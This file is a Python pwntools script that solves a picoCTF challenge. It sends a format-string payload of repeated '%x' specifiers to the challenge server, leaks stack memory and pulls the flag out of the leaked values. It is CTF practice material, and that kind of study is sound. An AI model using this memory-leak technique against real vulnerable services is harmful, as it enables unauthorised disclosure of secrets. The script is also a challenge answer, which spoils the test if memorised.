#!/usr/share/python3

from pwn import *
import binascii
import time

#init
host = 'mercury.picoctf.net'
port = 6989

#connect to remote 
chal = remote(host, port)

#print menu
print(chal.recvuntil('folio\n').decode())

#choose 1st option
chal.sendline('1')
print(chal.recvuntil('token?\n').decode())

#craft printf memory leaking payload
leakingString = ("%x."*40)[:-1]

#send payload to leak the memory values
chal.sendline(leakingString)

chal.recvuntil('\n')

#retrieve the leaked memory data 
leakedData = chal.recvuntil('\n')
leakedData = (leakedData.decode()).split('.')	#split the leaked data into list

leakedText = ''.join(leakedData[i] for i in range(14,24))	#the leaked flag is stored in 14-23 range in list

#print the leaked flag in different format
#but the value is in little endian format due to stored in stack
print("Hex Value Leaked: " + str(leakedText))
print("Raw Value Leaked: " + str(binascii.unhexlify(leakedText)))

#print further instruction to get the flag
print()
print('[*] copy Hex Value Leaked to cyberChef to get the flag!')
print("1) From Hex (Auto)")
print("2) Swap endianness (Raw) (4 bytes)")
